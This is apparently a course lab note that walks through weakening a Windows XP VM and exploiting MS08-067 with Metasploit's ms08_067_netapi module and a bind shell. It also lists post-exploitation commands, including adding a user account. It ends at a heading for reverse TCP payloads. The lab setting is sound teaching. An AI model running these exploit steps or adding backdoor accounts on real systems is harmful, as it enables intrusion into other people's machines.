# EHD Practical 10 - Metasploit

###### tags: #EHD 

## Table of Contents
```toc
```

## Setting Up a Target Vulnerable to MS08-067
**On Host PC**
1. Search the Internet for information about the Microsoft Security Bulletin MS08-067 and take note of the 6-digit knowledge base number
2. For this practical, the WinXP VM  is required

**On WinXP VM**
1. Go to the Control Panel and **Add or Remove Programs**
2. Check the box **Show Updates**. The list of installed programs and software updates will be displayed
3. Search the list of security updates for ones containing the Knowledge Base numbers 958644  or 2705219 of the MS08-067 or MS12-054 security bulletins. If the updates are listed on WinXP, remove them and restart the computer

> If not, WinXP is not patched against the MS08-067 vulnerability

4. Go to the Control Panel > Security Center
5. Under Manage Security Settings, select **Windows Firewall** and turn it off. The WinXP is now a vulnerable target

## Using the Metasploit Console
**On Kali VM**
> <u>Activating the Metasploit console:</u>
> - Click the Kali icon > 08 Exploitation Tools > Metasploit framework
> - Run `msfconsole` on the terminal

- To see all possible commands, type `help` at the `msf` prompt
- To see list of exploits, type `show exploits`
	- List of exploits and CVE numbers will be displayed
- To search for exploits related to SMB, type `search smb`
- To search for exploits related to MS08-067, type `search ms08_067`

1. Look for info on the exploit `ms08_067_netapi` and use it
```
info windows/smb/ms08_067_netapi
use windows/smb/ms08_067_netapi
```
2. At the exploit prompt, type `show options`
3. Set a remote host to target (RHOST)
```
set RHOST WinXP-IP
```
4. Type `show options` to view the RHOST set
5. To check which payloads can be used for a certain exploit, type the following command:
```
show payloads
```
6. View info on the payload `windows/shell/bind_tcp` and set it:
```
info windows/shell/bind_tcp
set windows/shell/bind_tcp
```
7. Type `show options` to view the options set for the payload
8. Run the exploit:
```
exploit
```

> If the exploit is successful, a remote connection will be established to the command prompt of the Windows XP VM
> - Run `dir` to list all files on the remote target
> - Type `set` to see list of current environment variables
> - To create a new user: `net user username password /add`

9. To quit from the remote connection, press <kbd>Ctrl</kbd>+<kbd>C</kbd>

## Using Reverse TCP Payload
